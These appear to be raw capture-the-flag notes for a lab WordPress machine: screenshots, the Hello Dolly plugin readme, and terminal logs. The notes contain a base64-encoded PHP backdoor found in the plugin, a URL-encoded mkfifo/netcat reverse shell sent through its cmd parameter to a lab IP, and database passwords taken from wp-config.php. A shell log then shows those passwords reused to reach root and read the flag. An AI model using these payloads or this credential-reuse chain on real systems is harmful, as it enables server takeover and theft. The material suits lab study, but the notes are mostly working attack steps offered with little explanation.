Login details
<img width="1607" height="792" alt="image" src="https://github.com/user-attachments/assets/a8e952f1-5b19-4b15-946d-d50b7ac7b43f" />

<img width="1619" height="691" alt="image" src="https://github.com/user-attachments/assets/a9e01e4b-df7b-4097-bbe5-5ffc71eae830" />
https://github.com/WordPress/hello-dolly
=== Hello Dolly ===
Contributors: matt, wordpressdotorg
Stable tag: 1.7.2
Tested up to: 6.1
Requires at least: 4.6

This is not just a plugin, it symbolizes the hope and enthusiasm of an entire generation summed up in two words sung most famously by Louis Armstrong.

== Description ==

This is not just a plugin, it symbolizes the hope and enthusiasm of an entire generation summed up in two words sung most famously by Louis Armstrong: Hello, Dolly. When activated you will randomly see a lyric from <cite>Hello, Dolly</cite> in the upper right of your admin screen on every page.

Thanks to Sanjib Ahmad for the artwork.
<img width="1546" height="763" alt="image" src="https://github.com/user-attachments/assets/0735570f-2e35-4c9e-bbb0-0a1fb3cb561c" />
eval(base64_decode('CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA='));

http://www.smol.thm/wp-admin/index.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff|%2Fbin%2Fbash%20-i%202%3E%261|nc%2010.4.124.126%201234%20%3E%2Ftmp%2Ff

define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'wpuser' );

/** Database password */
define( 'DB_PASSWORD', 'kbLSF2Vop#lw3rjDZ629*Z%G' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );


// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'xavi' );

/** Database password */
define( 'DB_PASSWORD', 'P@ssw0rdxavi@' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

wordpress.old  wordpress.old.zip
gege@ip-10-10-3-249:~$ cd wordpress.old
gege@ip-10-10-3-249:~/wordpress.old$ ls
index.php        wp-admin              wp-content         wp-load.php      wp-signup.php
license.txt      wp-blog-header.php    wp-cron.php        wp-login.php     wp-trackback.php
readme.html      wp-comments-post.php  wp-includes        wp-mail.php      xmlrpc.php
wp-activate.php  wp-config.php         wp-links-opml.php  wp-settings.php
gege@ip-10-10-3-249:~/wordpress.old$ cat wp-config.php
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the web site, you can copy this file to "wp-config.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/documentation/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'xavi' );

/** Database password */
define( 'DB_PASSWORD', 'P@ssw0rdxavi@' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication unique keys and salts.
 *
 * Change these to different unique phrases! You can generate these using
 * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
 *
 * You can change these at any point in time to invalidate all existing cookies.
 * This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'put your unique phrase here' );
define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
define( 'NONCE_KEY',        'put your unique phrase here' );
define( 'AUTH_SALT',        'put your unique phrase here' );
define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
define( 'NONCE_SALT',       'put your unique phrase here' );

/**#@-*/

/**
 * WordPress database table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/documentation/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', true );

/* Add any custom values between this line and the "stop editing" line. */



/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
        define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
gege@ip-10-10-3-249:~/wordpress.old$ su xavi
Password: 
xavi@ip-10-10-3-249:/home/gege/wordpress.old$ su root
Password: 
su: Authentication failure
xavi@ip-10-10-3-249:/home/gege/wordpress.old$ sudo -l
[sudo] password for xavi: 
Matching Defaults entries for xavi on ip-10-10-3-249:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User xavi may run the following commands on ip-10-10-3-249:
    (ALL : ALL) ALL
xavi@ip-10-10-3-249:/home/gege/wordpress.old$ sudo su
root@ip-10-10-3-249:/home/gege/wordpress.old$ ls
total 244K
drwxr-x---  5 gege gege     4.0K Aug 18 21:03 .
drwxr-x---  3 gege internal 4.0K Aug 18 20:53 ..
-rw-r--r--  1 gege gege      523 Aug 16  2023 .htaccess
-rw-r--r--  1 gege gege      405 Aug 16  2023 index.php
-rw-r--r--  1 gege gege      20K Aug 16  2023 license.txt
-rw-r--r--  1 gege gege     7.3K Aug 16  2023 readme.html
-rw-r--r--  1 gege gege     7.1K Aug 16  2023 wp-activate.php
drwxr-xr-x  9 gege gege     4.0K Aug 18 21:03 wp-admin
-rw-r--r--  1 gege gege      351 Aug 16  2023 wp-blog-header.php
-rw-r--r--  1 gege gege     2.3K Aug 16  2023 wp-comments-post.php
-rw-r--r--  1 gege gege     3.0K Aug 16  2023 wp-config.php
drwxr-xr-x  7 gege gege     4.0K Aug 18 21:03 wp-content
-rw-r--r--  1 gege gege     5.6K Aug 16  2023 wp-cron.php
drwxr-xr-x 27 gege gege      16K Aug 18 21:03 wp-includes
-rw-r--r--  1 gege gege     2.5K Aug 16  2023 wp-links-opml.php
-rw-r--r--  1 gege gege     3.9K Aug 16  2023 wp-load.php
-rw-r--r--  1 gege gege      49K Aug 16  2023 wp-login.php
-rw-r--r--  1 gege gege     8.4K Aug 16  2023 wp-mail.php
-rw-r--r--  1 gege gege      26K Aug 16  2023 wp-settings.php
-rw-r--r--  1 gege gege      34K Aug 16  2023 wp-signup.php
-rw-r--r--  1 gege gege     4.8K Aug 16  2023 wp-trackback.php
-rw-r--r--  1 gege gege     3.2K Aug 16  2023 xmlrpc.php
root@ip-10-10-3-249:/home/gege/wordpress.old$ cat /root/root.txt
bf89ea3ea0199235************
root@ip-10-10-3-249:/home/gege/wordpress.old$ 


